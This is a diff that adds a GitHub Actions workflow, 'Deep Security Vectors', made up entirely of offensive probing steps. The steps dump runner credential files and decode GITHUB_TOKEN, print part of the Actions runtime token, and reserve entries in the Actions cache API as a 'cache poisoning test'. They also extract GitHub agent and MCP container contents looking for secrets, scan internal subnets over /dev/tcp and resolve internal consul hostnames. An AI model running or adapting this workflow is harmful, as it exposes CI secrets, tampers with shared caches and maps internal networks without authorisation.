@@ -1,0 +1,133 @@
+name: Deep Security Vectors
+
+on:
+  workflow_dispatch:
+
+permissions:
+  id-token: write
+  contents: read
+  actions: read
+  packages: read
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+
+      - name: AWF Agent Token Exposure
+        continue-on-error: true
+        run: |
+          set +e
+          echo "=== AWF Agent Container ==="
+          docker create --name awf-agent ghcr.io/github/gh-aw-firewall/agent:latest 2>/dev/null
+          echo "=== Entrypoint.sh (token handling) ==="
+          docker cp awf-agent:/entrypoint.sh /tmp/entry.sh 2>/dev/null || docker cp awf-agent:/usr/local/bin/entrypoint.sh /tmp/entry.sh 2>/dev/null
+          grep -n "TOKEN\|SECRET\|KEY\|CREDENTIAL\|cache\|proc.*environ\|one.shot" /tmp/entry.sh 2>/dev/null | head -30
+          echo ""
+          echo "=== one-shot-token.so ==="
+          docker cp awf-agent:/usr/local/lib/one-shot-token.so /tmp/oneshot.so 2>/dev/null
+          strings /tmp/oneshot.so 2>/dev/null | grep -iE "TOKEN|KEY|SECRET|CACHE|proc|environ|getenv" | head -20
+          echo ""
+          echo "=== Docker socket mount test ==="
+          docker cp awf-agent:/app/ /tmp/awf-app/ 2>/dev/null
+          ls -la /tmp/awf-app/ 2>/dev/null | head -20
+          echo ""
+          echo "=== Token cache file pattern ==="
+          find /tmp -name ".awf-token-cache*" 2>/dev/null
+          echo ""
+
+      - name: GitHub Actions Runner Token
+        continue-on-error: true
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          set +e
+          echo "=== Runner .credentials file ==="
+          find /home/runner -name ".credentials*" -o -name "*.credential*" 2>/dev/null | while read f; do
+            echo "FILE: $f"
+            cat "$f" 2>/dev/null | head -10
+          done
+          echo ""
+          echo "=== Runner .runner file ==="
+          cat /home/runner/runners/*/.runner 2>/dev/null
+          echo ""
+          echo "=== Runner work temp ==="
+          find /home/runner/runners -name "*.json" -path "*_temp*" 2>/dev/null | head -10
+          echo ""
+          echo "=== ACTIONS_RUNTIME_TOKEN ==="
+          echo "Runtime token set: $([ -n \"$ACTIONS_RUNTIME_TOKEN\" ] && echo YES || echo NO)"
+          echo "Runtime URL: $ACTIONS_RUNTIME_URL"
+          echo "Cache URL: $ACTIONS_CACHE_URL"
+          echo ""
+          echo "=== JWT decode GITHUB_TOKEN ==="
+          echo "$GH_TOKEN" | cut -d_ -f3- | cut -d. -f2 | tr "_-" "/+" | base64 -d 2>/dev/null
+          echo ""
+
+      - name: GitHub MCP Server Analysis
+        continue-on-error: true
+        run: |
+          set +e
+          echo "=== MCP Server Image ==="
+          docker create --name mcp ghcr.io/github/github-mcp-server:latest 2>/dev/null
+          echo "=== MCP binary ==="
+          docker cp mcp:/app/ /tmp/mcp-app/ 2>/dev/null || docker cp mcp:/usr/local/bin/ /tmp/mcp-bin/ 2>/dev/null
+          ls -la /tmp/mcp-app/ 2>/dev/null || ls -la /tmp/mcp-bin/ 2>/dev/null | head -20
+          echo ""
+          echo "=== MCP config ==="
+          docker cp mcp:/etc/ /tmp/mcp-etc/ 2>/dev/null
+          find /tmp/mcp-etc -name "*.json" -o -name "*.yml" -o -name "*.yaml" -o -name "*.toml" 2>/dev/null | head -10
+          echo ""
+          echo "=== MCPG Image ==="
+          docker create --name mcpg ghcr.io/github/gh-aw-mcpg:latest 2>/dev/null
+          docker cp mcpg:/app/ /tmp/mcpg-app/ 2>/dev/null || docker cp mcpg:/usr/local/bin/ /tmp/mcpg-bin/ 2>/dev/null
+          ls -la /tmp/mcpg-app/ 2>/dev/null || ls -la /tmp/mcpg-bin/ 2>/dev/null | head -20
+          echo ""
+
+      - name: Actions Cache Poisoning Test
+        continue-on-error: true
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          set +e
+          echo "=== Actions Cache API ==="
+          ACTIONS_CACHE_URL=$(printenv ACTIONS_CACHE_URL)
+          ACTIONS_RUNTIME_TOKEN=$(printenv ACTIONS_RUNTIME_TOKEN)
+          echo "Cache URL: $ACTIONS_CACHE_URL"
+          echo "Runtime Token: $(echo $ACTIONS_RUNTIME_TOKEN | head -c 30)..."
+          if [ -n "$ACTIONS_CACHE_URL" ]; then
+            echo "=== List caches ==="
+            curl -sS "$ACTIONS_CACHE_URL/_apis/artifactcache/cache?keys=&version=" -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" 2>&1 | head -50
+            echo ""
+            echo "=== Reserve cache entry ==="
+            curl -sS -X POST "$ACTIONS_CACHE_URL/_apis/artifactcache/caches" -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" -H "Content-Type: application/json" -d "{\"key\":\"test-key\",\"version\":\"test\"}" 2>&1 | head -10
+          fi
+          echo ""
+          echo "=== npm/pip cache dirs ==="
+          ls -la ~/.npm/_cacache/ 2>/dev/null | head -5
+          ls -la ~/.cache/pip/ 2>/dev/null | head -5
+          echo ""
+
+      - name: Network Lateral Movement
+        continue-on-error: true
+        run: |
+          set +e
+          echo "=== Listening services ==="
+          ss -tlnp 2>/dev/null | head -20
+          echo ""
+          echo "=== Connected sockets ==="
+          ss -tnp 2>/dev/null | head -20
+          echo ""
+          echo "=== DNS resolution ==="
+          nslookup github.com 2>/dev/null | head -5
+          echo ""
+          echo "=== Try reaching other runner subnets ==="
+          for i in 1 2 3 4 5; do
+            timeout 1 bash -c "echo >/dev/tcp/10.1.0.$i/22" 2>/dev/null && echo "10.1.0.$i:22 OPEN" || echo "10.1.0.$i:22 closed"
+          done
+          echo ""
+          echo "=== GitHub internal DNS ==="
+          nslookup copilot-proxy.service.consul 2>/dev/null
+          nslookup api-proxy.service.consul 2>/dev/null
+          nslookup actions-cache.service.consul 2>/dev/null
+          echo ""
+          echo "=== Complete ==="
